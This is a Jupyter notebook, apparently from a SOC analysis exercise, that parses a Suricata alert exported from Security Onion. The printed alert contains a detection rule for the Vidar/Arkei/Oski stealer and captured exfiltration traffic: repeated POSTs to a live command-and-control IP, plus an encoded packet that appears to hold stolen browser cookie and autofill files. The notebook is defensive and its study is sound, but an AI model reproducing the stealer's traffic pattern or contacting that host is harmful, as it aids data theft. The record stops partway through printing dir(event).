{
 "cells": [
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": [
    "Part 3 - analyzing events\n",
    "---\n",
    "\n",
    "Through the common shared folder Download event payload and load json into dict to parse message\n",
    "\n"
   ],
   "id": "4b224d4f048ac6c3"
  },
  {
   "cell_type": "code",
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2025-02-09T14:03:23.636146Z",
     "start_time": "2025-02-09T14:03:23.629356Z"
    }
   },
   "source": [
    "with open('data/event_payload.json', 'r+', encoding='utf-8') as  file:\n",
    "    content = file.readlines()"
   ],
   "outputs": [],
   "execution_count": 1
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:03:27.943952Z",
     "start_time": "2025-02-09T14:03:27.930669Z"
    }
   },
   "cell_type": "code",
   "source": "content",
   "id": "e9dc81de5f8fc9e2",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['{\\n',\n",
       " '  \"@timestamp\": \"2022-01-07T16:07:35.954Z\",\\n',\n",
       " '  \"container.id\": \"eve-2025-02-03-13:52.json\",\\n',\n",
       " '  \"data_stream.dataset\": \"import\",\\n',\n",
       " '  \"data_stream.namespace\": \"so\",\\n',\n",
       " '  \"data_stream.type\": \"logs\",\\n',\n",
       " '  \"destination.geo.continent_name\": \"Asia\",\\n',\n",
       " '  \"destination.geo.country_iso_code\": \"SG\",\\n',\n",
       " '  \"destination.geo.country_name\": \"Singapore\",\\n',\n",
       " '  \"destination.geo.ip\": \"2.56.57.108\",\\n',\n",
       " '  \"destination.geo.location.lat\": 1.3667,\\n',\n",
       " '  \"destination.geo.location.lon\": 103.8,\\n',\n",
       " '  \"destination.geo.timezone\": \"Asia/Singapore\",\\n',\n",
       " '  \"destination.ip\": \"2.56.57.108\",\\n',\n",
       " '  \"destination.port\": 80,\\n',\n",
       " '  \"destination_geo.asn\": 3758,\\n',\n",
       " '  \"destination_geo.ip\": \"2.56.57.108\",\\n',\n",
       " '  \"destination_geo.network\": \"2.56.56.0/22\",\\n',\n",
       " '  \"destination_geo.organization_name\": \"SingNet\",\\n',\n",
       " '  \"ecs.version\": \"8.0.0\",\\n',\n",
       " '  \"elastic_agent.id\": \"92fca1ef-b1d9-454d-a7bf-6879a8fd44af\",\\n',\n",
       " '  \"elastic_agent.snapshot\": false,\\n',\n",
       " '  \"elastic_agent.version\": \"8.14.3\",\\n',\n",
       " '  \"event.acknowledged\": true,\\n',\n",
       " '  \"event.category\": \"network\",\\n',\n",
       " '  \"event.dataset\": \"suricata.alert\",\\n',\n",
       " '  \"event.escalated\": true,\\n',\n",
       " '  \"event.imported\": true,\\n',\n",
       " '  \"event.ingested\": \"2025-02-03T13:52:48.771Z\",\\n',\n",
       " '  \"event.module\": \"suricata\",\\n',\n",
       " '  \"event.severity\": 3,\\n',\n",
       " '  \"event.severity_label\": \"high\",\\n',\n",
       " '  \"import.file\": \"eve-2025-02-03-13:52.json\",\\n',\n",
       " '  \"import.id\": \"e687298812366f48eab16e2676dd765a\",\\n',\n",
       " '  \"input.type\": \"log\",\\n',\n",
       " '  \"log.file.path\": \"/nsm/import/e687298812366f48eab16e2676dd765a/suricata/eve-2025-02-03-13:52.json\",\\n',\n",
       " '  \"log.id.uid\": \"1395436451163378\",\\n',\n",
       " '  \"log.offset\": 61353,\\n',\n",
       " '  \"message\": \"{\\\\\"timestamp\\\\\":\\\\\"2022-01-07T16:07:35.954561+0000\\\\\",\\\\\"flow_id\\\\\":1395436451163378,\\\\\"pcap_cnt\\\\\":4281,\\\\\"event_type\\\\\":\\\\\"alert\\\\\",\\\\\"src_ip\\\\\":\\\\\"192.168.1.216\\\\\",\\\\\"src_port\\\\\":49738,\\\\\"dest_ip\\\\\":\\\\\"2.56.57.108\\\\\",\\\\\"dest_port\\\\\":80,\\\\\"proto\\\\\":\\\\\"TCP\\\\\",\\\\\"pkt_src\\\\\":\\\\\"wire/pcap\\\\\",\\\\\"metadata\\\\\":{\\\\\"flowbits\\\\\":[\\\\\"ET.formdata\\\\\",\\\\\"ET.Zberp\\\\\",\\\\\"http.dottedquadhost\\\\\",\\\\\"ET.http.binary\\\\\"]},\\\\\"community_id\\\\\":\\\\\"1:IUipQzvXtgxVOXejqDEjrXJ7TuA=\\\\\",\\\\\"tx_id\\\\\":8,\\\\\"alert\\\\\":{\\\\\"action\\\\\":\\\\\"allowed\\\\\",\\\\\"gid\\\\\":1,\\\\\"signature_id\\\\\":2034813,\\\\\"rev\\\\\":5,\\\\\"signature\\\\\":\\\\\"ET MALWARE Vidar/Arkei/Megumin/Oski Stealer HTTP POST Pattern\\\\\",\\\\\"category\\\\\":\\\\\"A Network Trojan was detected\\\\\",\\\\\"severity\\\\\":1,\\\\\"metadata\\\\\":{\\\\\"affected_product\\\\\":[\\\\\"Windows_XP_Vista_7_8_10_Server_32_64_Bit\\\\\"],\\\\\"attack_target\\\\\":[\\\\\"Client_Endpoint\\\\\"],\\\\\"created_at\\\\\":[\\\\\"2018_08_15\\\\\"],\\\\\"deployment\\\\\":[\\\\\"Perimeter\\\\\"],\\\\\"malware_family\\\\\":[\\\\\"Arkei\\\\\"],\\\\\"signature_severity\\\\\":[\\\\\"Major\\\\\"],\\\\\"updated_at\\\\\":[\\\\\"2020_08_28\\\\\"]},\\\\\"rule\\\\\":\\\\\"alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\\\\\\\\\\\\\"ET MALWARE Vidar/Arkei/Megumin/Oski Stealer HTTP POST Pattern\\\\\\\\\\\\\"; flow:established,to_server; http.method; content:\\\\\\\\\\\\\"POST\\\\\\\\\\\\\"; http.header; content:\\\\\\\\\\\\\"boundary=1BEF0A57BE110FD467A\\\\\\\\\\\\\"; fast_pattern; reference:md5,dd5e5142ba2ab5f31e5518396c45ba1f; classtype:trojan-activity; sid:2034813; rev:5; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2018_08_15, deployment Perimeter, malware_family Arkei, signature_severity Major, updated_at 2020_08_28;)\\\\\"},\\\\\"app_proto\\\\\":\\\\\"http\\\\\",\\\\\"direction\\\\\":\\\\\"to_server\\\\\",\\\\\"payload_printable\\\\\":\\\\\"POST /osk//6.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//1.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//2.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//3.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//4.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//5.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//7.jpg HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk//main.php HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\\\\\r\\\\\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\\\\\r\\\\\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\\\\\r\\\\\\\\nContent-Length: 25\\\\\\\\r\\\\\\\\nHost: 2.56.57.108\\\\\\\\r\\\\\\\\nConnection: Keep-Alive\\\\\\\\r\\\\\\\\nCache-Control: no-cache\\\\\\\\r\\\\\\\\n\\\\\\\\r\\\\\\\\n--1BEF0A57BE110FD467A--\\\\\\\\r\\\\\\\\nPOST /osk/ HTTP/1.1\\\\\\\\r\\\\\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\\\\\r\\\\\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\\\\\r\\\\\\\\nAccept-Charset: iso-88\\\\\",\\\\\"stream\\\\\":1,\\\\\"packet\\\\\":\\\\\"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\\\\\",\\\\\"packet_info\\\\\":{\\\\\"linktype\\\\\":1}}\",\\n',\n",
       " '  \"network.community_id\": \"1:IUipQzvXtgxVOXejqDEjrXJ7TuA=\",\\n',\n",
       " '  \"network.data.decoded\": \"POST /osk//6.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//1.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//2.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//3.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//4.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//5.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//7.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//main.php HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk/ HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-88\",\\n',\n",
       " '  \"network.packet_source\": \"wire/pcap\",\\n',\n",
       " '  \"network.transport\": \"TCP\",\\n',\n",
       " '  \"observer.name\": \"securityonion\",\\n',\n",
       " '  \"rule.action\": \"allowed\",\\n',\n",
       " '  \"rule.category\": \"A Network Trojan was detected\",\\n',\n",
       " '  \"rule.gid\": 1,\\n',\n",
       " '  \"rule.metadata.affected_product\": [\\n',\n",
       " '    \"Windows_XP_Vista_7_8_10_Server_32_64_Bit\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.metadata.attack_target\": [\\n',\n",
       " '    \"Client_Endpoint\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.metadata.created_at\": [\\n',\n",
       " '    \"2018_08_15\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.metadata.deployment\": [\\n',\n",
       " '    \"Perimeter\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.metadata.malware_family\": [\\n',\n",
       " '    \"Arkei\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.metadata.signature_severity\": [\\n',\n",
       " '    \"Major\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.metadata.updated_at\": [\\n',\n",
       " '    \"2020_08_28\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"rule.name\": \"ET MALWARE Vidar/Arkei/Megumin/Oski Stealer HTTP POST Pattern\",\\n',\n",
       " '  \"rule.reference\": \"https://community.emergingthreats.net\",\\n',\n",
       " '  \"rule.rev\": 5,\\n',\n",
       " '  \"rule.rule\": \"alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\\\\\"ET MALWARE Vidar/Arkei/Megumin/Oski Stealer HTTP POST Pattern\\\\\"; flow:established,to_server; http.method; content:\\\\\"POST\\\\\"; http.header; content:\\\\\"boundary=1BEF0A57BE110FD467A\\\\\"; fast_pattern; reference:md5,dd5e5142ba2ab5f31e5518396c45ba1f; classtype:trojan-activity; sid:2034813; rev:5; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2018_08_15, deployment Perimeter, malware_family Arkei, signature_severity Major, updated_at 2020_08_28;)\",\\n',\n",
       " '  \"rule.ruleset\": \"Emerging Threats\",\\n',\n",
       " '  \"rule.severity\": 1,\\n',\n",
       " '  \"rule.uuid\": \"2034813\",\\n',\n",
       " '  \"source.ip\": \"192.168.1.216\",\\n',\n",
       " '  \"source.port\": 49738,\\n',\n",
       " '  \"tags\": [\\n',\n",
       " '    \"alert\",\\n',\n",
       " '    \"alert\",\\n',\n",
       " '    \"alert\"\\n',\n",
       " '  ],\\n',\n",
       " '  \"soc_id\": \"X5cVzJQBSiD-OG3S7ibA\",\\n',\n",
       " '  \"soc_score\": 2,\\n',\n",
       " '  \"soc_type\": \"\",\\n',\n",
       " '  \"soc_timestamp\": \"2022-01-07T16:07:35.954Z\",\\n',\n",
       " '  \"soc_source\": \"securityonion:.ds-logs-suricata.alerts-so-2025.02.03-000001\"\\n',\n",
       " '}\\n']"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 2
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:03:29.535854Z",
     "start_time": "2025-02-09T14:03:29.531868Z"
    }
   },
   "cell_type": "code",
   "source": "print(\"ready\")",
   "id": "48b7499e46d2661d",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ready\n"
     ]
    }
   ],
   "execution_count": 3
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:04:22.443337Z",
     "start_time": "2025-02-09T14:04:22.440011Z"
    }
   },
   "cell_type": "code",
   "source": [
    "import json\n",
    "\n",
    "json = json.loads(''.join(content))"
   ],
   "id": "d4d6984aa278723",
   "outputs": [],
   "execution_count": 5
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:04:42.458385Z",
     "start_time": "2025-02-09T14:04:42.455637Z"
    }
   },
   "cell_type": "code",
   "source": "event = dict(json)",
   "id": "a2471eaf61d3333d",
   "outputs": [],
   "execution_count": 7
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:05:03.665563Z",
     "start_time": "2025-02-09T14:05:03.661018Z"
    }
   },
   "cell_type": "code",
   "source": "dir(event)",
   "id": "81a66b6ed239cf63",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['__class__',\n",
       " '__class_getitem__',\n",
       " '__contains__',\n",
       " '__delattr__',\n",
       " '__delitem__',\n",
       " '__dir__',\n",
       " '__doc__',\n",
       " '__eq__',\n",
       " '__format__',\n",
       " '__ge__',\n",
       " '__getattribute__',\n",
       " '__getitem__',\n",
       " '__getstate__',\n",
       " '__gt__',\n",
       " '__hash__',\n",
       " '__init__',\n",
       " '__init_subclass__',\n",
       " '__ior__',\n",
       " '__iter__',\n",
       " '__le__',\n",
       " '__len__',\n",
       " '__lt__',\n",
       " '__ne__',\n",
       " '__new__',\n",
       " '__or__',\n",
